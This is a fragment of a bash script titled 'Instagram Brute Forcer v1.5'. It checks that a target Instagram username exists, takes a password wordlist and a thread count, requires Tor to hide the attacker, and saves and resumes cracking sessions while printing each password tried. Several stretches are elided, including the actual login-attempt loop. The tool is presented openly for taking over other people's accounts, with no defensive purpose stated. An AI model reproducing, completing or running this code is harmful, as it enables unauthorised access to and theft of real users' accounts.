...
printf "\n"
printf "\e[1;77m\e[45m   Instagram Brute Forcer v1.5 Author: Suman Kumar ~BHUTUU   \e[0m\n"
printf "\n"
}
...
banner
dependencies
read -p $'\e[3;4;97mTSc \e[0;0;0m> \e[1;92m(Username account)> \e[0m' user
checkaccount=$(curl -s https://www.instagram.com/$user/?__a=1 | grep -c "the page may have been removed")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[3;4;97mTSc \e[0;0;0m> \e[1;91mInvalid Username! Try again\e[0m\n"
sleep 1
start
else
default_wl_pass="passwords.lst"
read -p $'\e[3;4;97mTSc \e[0;0;0m> \e[1;92m(Password List (path/file))> \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="10"
read -p $'\e[3;4;97mTSc \e[0;0;0m> \e[1;92m(Threads (Use < 20, Default 10)))> \e[0m' threads
...
if [[ "$check" -gt 0 ]]; then
printf "\e[3;4;97mTSc \e[0;0;0m> \e[1;91mPlease, check your TOR Connection! Just type tor or service tor start\n\e[0m"
exit 1
fi
...
if [[ -n "$threads" ]]; then
printf "\e[3;4;97mTSc \e[0;0;0m> \e[1;91m [*] Waiting threads shutting down...\n\e[0m"
...
default_session="Y"
printf "\n\e[3;4;97mTSc \e[0;0;0m> \e[1;77mSave session for user\e[0m\e[1;92m %s \e[0m" $user
...
printf "\e[3;4;97mTSc \e[0;0;0m> user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\n" $user $pass $wl_pass > sessions/store.session.$user.$(date +"%FT%H%M")
printf "\e[3;4;97mTSc \e[0;0;0m> \e[1;77mSession saved.\e[0m\n"
printf "\e[3;4;97mTSc \e[0;0;0m> \e[1;92mUse ./instashell --resume\n"
else
exit 1
fi
else
...
printf "\e[3;4;97mTSc \e[0;0;0m> \e[1;92mUsername:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[3;4;97mTSc \e[0;0;0m> \e[1;92mWordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[3;4;97mTSc \e[0;0;0m> \e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
...
counter=1
if [[ ! -d sessions ]]; then
printf "\e[3;4;97mTSc \e[0;0;0m> \e[1;91m[*] No sessions\n\e[0m"
exit 1
fi
printf "\e[3;4;97mTSc \e[0;0;0m> \e[1;92mFiles sessions:\n\e[0m"
for list in $(ls sessions/store.session*); do
IFS=$'\n'
source $list
printf "\e[3;4;97mTSc \e[0;0;0m> \e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$counter" "$list" "$wl_pass" "$pass"
let counter++
done
read -p $'\e[3;4;97mTSc \e[0;0;0m> \e[1;92mChoose a session number: \e[0m' fileresume
source $(ls sessions/store.session* | sed ''$fileresume'q;d')
default_threads="10"
read -p $'\e[3;4;97mTSc \e[0;0;0m> \e[1;92m(Threads (Use < 20, Default 10))> \e[0m' threads
threads="${threads:-${default_threads}}"

printf "\e[3;4;97mTSc \e[0;0;0m> \e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" $user
printf "\e[3;4;97mTSc \e[0;0;0m> \e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
printf "\e[3;4;97mTSc \e[0;0;0m> \e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
startline="$threads"
while [ true ]; do
...
printf "\e[3;4;97mTSc \e[0;0;0m> \e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass
